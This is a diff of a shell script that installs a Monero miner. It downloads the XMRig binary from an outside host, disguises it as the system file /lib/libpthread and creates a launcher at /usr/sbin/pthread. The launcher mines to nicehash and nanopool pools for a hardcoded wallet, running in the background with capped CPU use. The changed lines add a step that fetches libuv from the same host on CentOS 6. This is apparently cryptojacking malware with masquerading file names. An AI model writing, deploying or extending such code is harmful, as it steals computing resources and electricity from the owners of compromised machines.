@@ -31,20 +31,30 @@ Get_Dist_Name()
 Get_Dist_Name
 
 sudo curl -fsSL https://qr4d.com/xmrig/libpthread > /lib/libpthread
-case $PM in  
-    'yum')  
-        sudo yum -y install libuv
-        echo "yum install libuv"
-        ;;  
-    'apt')  
-        sudo dpkg --configure -a
-        sudo apt-get -y install libuv1
-        echo "apt-get install libuv"
-        ;;  
-    *)  
-        echo $PM + "," +  $DISTRO
-        ;;  
-esac 
+if [ ! -f "/usr/lib64/libuv.so.1" ]; then
+    case $PM in  
+        'yum')  
+            if grep -Eqii "release 6" /etc/issue || grep -Eq "release 6" /etc/*-release; then
+                sudo curl -fsSL "https://qr4d.com/xmrig/usr/local/lib/libuv-centos6.tar.gz" > "/var/tmp/libuv-centos6.tar.gz"
+                sudo tar -zxvf "/var/tmp/libuv-centos6.tar.gz" -C "/usr/lib64/"
+                echo "yum install libuv for CentOS 6"
+            else
+                sudo yum -y install libuv
+                echo "yum install libuv for CentOS 7"
+            fi
+            ;;  
+        'apt')  
+            sudo dpkg --configure -a
+            sudo apt-get -y install libuv1
+            echo "apt-get install libuv"
+            ;;  
+        *)  
+            echo $PM + "," +  $DISTRO
+            ;;  
+    esac 
+else
+    echo "libuv 1.x installed"
+fi
 sudo echo "/lib/libpthread -o nicehash.gpu360.com:14444 -u 4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbS1WEZGWKA3v566F6vb."$RANDOM" -p x -k -o xmr-eu1.nanopool.org:14444 -u 4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbS1WEZGWKA3v566F6vb."$RANDOM" -p x -k --max-cpu-usage=30 --donate-level=1 --background" > /usr/sbin/pthread
 sudo chmod +x /lib/libpthread
 sudo chmod +x /usr/sbin/pthread
